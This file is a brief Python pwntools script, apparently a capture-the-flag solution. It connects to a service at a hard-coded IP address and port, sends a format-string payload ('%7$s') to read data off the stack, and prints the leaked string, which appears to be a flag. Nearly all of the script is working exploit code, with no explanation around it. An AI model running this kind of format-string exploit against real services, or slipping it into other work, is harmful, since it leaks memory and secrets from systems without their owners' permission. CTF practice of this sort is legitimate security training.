# #nc 13.214.30.13 10002

from pwn import *
from binascii import unhexlify

p = remote("13.214.30.13", 10002)
p.recvuntil(b"?")
p.sendline(b"%7$s")
p.recvline()
ans = p.recvuntil(b"}")
p.close()

ans = str(ans)

ans = ans.split(" ")
print(ans[1])